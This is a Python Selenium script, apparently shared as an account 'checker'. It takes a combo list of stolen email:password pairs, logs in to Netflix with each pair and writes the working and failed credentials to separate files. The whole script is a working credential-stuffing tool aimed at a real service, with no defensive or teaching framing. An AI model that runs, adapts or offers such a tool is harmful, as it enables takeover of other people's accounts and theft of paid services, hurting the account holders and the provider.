from selenium import webdriver
from colored import fg, bg, attr
from time import sleep
import os
import platform

print(fg("#FF0099") + '''

                                                                                        
8 8888888888   8 8888          8 8888 `8.`8888.      ,8' 8 8888888888   8 888888888o.   
8 8888         8 8888          8 8888  `8.`8888.    ,8'  8 8888         8 8888    `88.  
8 8888         8 8888          8 8888   `8.`8888.  ,8'   8 8888         8 8888     `88  
8 8888         8 8888          8 8888    `8.`8888.,8'    8 8888         8 8888     ,88  
8 888888888888 8 8888          8 8888     `8.`88888'     8 888888888888 8 8888.   ,88'  
8 8888         8 8888          8 8888     .88.`8888.     8 8888         8 888888888P'   
8 8888         8 8888          8 8888    .8'`8.`8888.    8 8888         8 8888`8b       
8 8888         8 8888          8 8888   .8'  `8.`8888.   8 8888         8 8888 `8b.     
8 8888         8 8888          8 8888  .8'    `8.`8888.  8 8888         8 8888   `8b.   
8 8888         8 888888888888  8 8888 .8'      `8.`8888. 8 888888888888 8 8888     `88. 

''' + attr("reset") + '\n')

sleep(1)

print(fg("black") + bg("#FFFF00") + '[*-*] This Checker Coded By ROOTXNOVA [*-*]\n\n' + attr("reset"))

sleep(2)

combo_list = input(fg("#FF0099") + '~/~ Enter Combo List [Email:Pass] : ')

print("Uploaded Now, Waiting Sir I Will Check This Accounts Now ...\n\n" + attr("reset"))

accounts = open(combo_list, 'r')


for acc in accounts:
	driver = webdriver.Chrome()
	driver.get("https://www.netflix.com/eg-en/login")
	splitor = acc.split(":")
	username = splitor[0]
	password = splitor[1]
	ok = '\n'
	driver.find_element_by_name('userLoginId').send_keys(username)
	driver.find_element_by_name('password').send_keys(password + ok)
	sleep(1)
	current_link = driver.current_url

	if current_link == "https://www.netflix.com/browse":
		with open('Valid.txt', 'a+') as live:
			live.write(username+':'+password+'Checked By ROOTXNOVA\n================================================\n')
		driver.quit()
	else:
		with open('Unvalid.txt', 'a+') as unlive:
			unlive.write(username+':'+password+'Checked By ROOTXNOVA\n================================================\n')
		driver.quit()


info = {}
system_name = platform.system()
print(system_name)

if system_name == "Windows":
	os.system("cls")
	print(fg("#00FF00")+'Valid Netflix Accounts\n=======================================')
	res_live = open('Valid.txt', 'r').read()
	print(res_live)
	sleep(1)
	print(fg("#FD1C03")+'Unvalid Netflix Accounts\n=======================================')
	res_unlive = open('Unvalid.txt', 'r').read()
	print(res_unlive)

else:
	os.system("clear")
	print(fg("#00FF00")+'Valid Netflix Accounts\n=======================================')
	res_live = open('Valid.txt', 'r').read()
	print(res_live)
	sleep(1)
	print(fg("#FD1C03")+'Unvalid Netflix Accounts\n=======================================')
	res_unlive = open('Unvalid.txt', 'r').read()
	print(res_unlive)
